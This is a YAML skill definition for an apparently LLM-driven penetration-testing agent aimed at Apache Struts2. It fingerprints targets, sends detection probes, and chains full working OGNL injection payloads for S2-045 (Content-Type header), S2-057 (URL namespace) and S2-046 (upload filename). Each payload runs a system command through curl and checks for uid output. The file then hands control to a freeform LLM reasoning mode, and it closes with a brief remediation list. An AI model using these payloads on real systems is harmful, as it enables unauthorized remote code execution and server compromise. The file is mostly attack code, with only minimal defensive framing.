skill_id: struts2_ognl_rce
name: "Struts2 OGNL 表达式注入 RCE"
category: web_rce
phase: foothold
version: "2.0"

match:
  rules:
    - fingerprint_contains: ["struts"]
    - fingerprint_contains: ["opensymphony"]
    - fingerprint_contains: ["xwork"]
    - fingerprint_contains: ["Showcase"]
    - evidence_contains: ["struts"]
    - evidence_contains: ["S2-"]
    - evidence_contains: ["OGNL"]
    - evidence_contains: ["opensymphony"]
    - evidence_contains: ["showcase"]
    - cve_matches: ["CVE-2017-5638", "CVE-2017-9805", "CVE-2018-11776", "CVE-2017-9791", "CVE-2019-0230"]

probes:
  - id: confirm_struts
    description: "确认 Struts2 框架"
    steps:
      - command: |
          curl -s -D - {ENDPOINT} \
            -H "Content-Type: %{(#test='multipart/form-data')}" \
            --max-time 10
        parse_rules:
          - if_contains: ["struts", "opensymphony", "xwork", "OGNL"]
            set: { struts_confirmed: true }
          - if_contains: ["jakarta", "multipart"]
            set: { struts_confirmed: true, multipart_present: true }

      - command: |
          curl -s -o /dev/null -w "%{http_code}" \
            {ENDPOINT}/test.action --max-time 10
        parse_rules:
          - if_contains: ["404", "200", "302"]
            set: { action_suffix_works: true }

      - command: |
          resp=$(curl -s -D - -o /dev/null \
            "{ENDPOINT}/%24%7B233*233%7D/actionChain1.action" \
            --max-time 10 2>&1)
          echo "$resp"
          if echo "$resp" | grep -q "54289"; then
            echo "S2057_CONFIRMED"
          fi
        parse_rules:
          - if_contains: ["54289", "S2057_CONFIRMED"]
            set: { struts_confirmed: true, s2057_verified: true }

exploit_paths:
  - path_id: s2_045
    name: "S2-045 Content-Type OGNL 注入"
    priority: 1
    conditions:
      struts_confirmed: true
    steps:
      - id: s2045_detect
        description: "S2-045 探测"
        command: |
          curl -s -D - {ENDPOINT} \
            -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-S2-Test','S2-045-OK')}.multipart/form-data" \
            --max-time 10
        timeout: 15
        success_criteria:
          stdout_contains_any: ["X-S2-Test", "S2-045-OK"]
        on_success: s2045_rce
        on_fail: next_path

      - id: s2045_rce
        description: "S2-045 RCE"
        command: |
          curl -s {ENDPOINT} \
            -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
            --max-time 15
        timeout: 20
        success_criteria:
          stdout_regex: "uid=\\d+\\(\\w+\\)"
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          current_user: stdout
          shell_type: "rce_s2045"

  - path_id: s2_057
    name: "S2-057 namespace OGNL 注入"
    priority: 2
    conditions:
      struts_confirmed: true
    steps:
      - id: s2057_detect
        description: "S2-057 探测"
        command: |
          curl -s -D - -o /dev/null \
            "{ENDPOINT}/%24%7B233*233%7D/actionChain1.action" \
            --max-time 10
        timeout: 15
        success_criteria:
          stdout_contains_any: ["54289", "Location"]
        on_success: s2057_rce
        on_fail: next_path

      - id: s2057_rce
        description: "S2-057 RCE（命令输出在 Location 响应头）"
        command: |
          curl -s -D - -o /dev/null \
            "{ENDPOINT}/%24%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec('id')).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action" \
            --max-time 15
        timeout: 20
        success_criteria:
          stdout_regex: "uid=\\d+\\(\\w+\\)"
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_s2057"

  - path_id: s2_046
    name: "S2-046 Content-Disposition OGNL 注入"
    priority: 3
    conditions:
      struts_confirmed: true
    steps:
      - id: s2046_rce
        description: "S2-046: 文件上传 filename 注入 OGNL"
        command: |
          curl -s {ENDPOINT} \
            -F "upload=@/dev/null;filename=%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())};\x00b" \
            --max-time 15
        timeout: 20
        success_criteria:
          stdout_regex: "uid=\\d+\\(\\w+\\)"
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_s2046"

  - path_id: llm_freeform
    name: "LLM 自由推理"
    priority: 99
    mode: react_freeform
    max_rounds: 5
    conditions:
      struts_confirmed: true

remediation: |
  1. 升级 Struts2 至最新稳定版
  2. 使用 Struts2 安全插件限制 OGNL 表达式执行
  3. WAF 过滤 Content-Type 中的 OGNL 特征（%{, #context, @java）
  4. 移除不必要的 DevMode 和详细错误输出
